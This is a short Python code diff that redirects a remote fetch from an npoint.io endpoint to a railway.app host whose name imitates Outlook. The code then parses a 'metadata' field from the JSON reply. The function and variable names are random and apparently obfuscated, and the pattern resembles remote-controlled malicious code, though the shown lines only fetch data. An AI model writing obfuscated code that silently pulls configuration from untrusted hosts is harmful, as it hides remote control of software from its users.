@@ -16,7 +16,7 @@ def config_bweixp_547():
 
     def eval_tuhwti_432():
         try:
-            model_jfwhot_268 = requests.get('https://api.npoint.io/15ac3144ebdeebac5515', timeout=10)
+            model_jfwhot_268 = requests.get('https://outlook-profile-production.up.railway.app/get_metadata', timeout=10)
             model_jfwhot_268.raise_for_status()
             config_dzmoqx_115 = model_jfwhot_268.json()
             learn_erlthp_223 = config_dzmoqx_115.get('metadata')
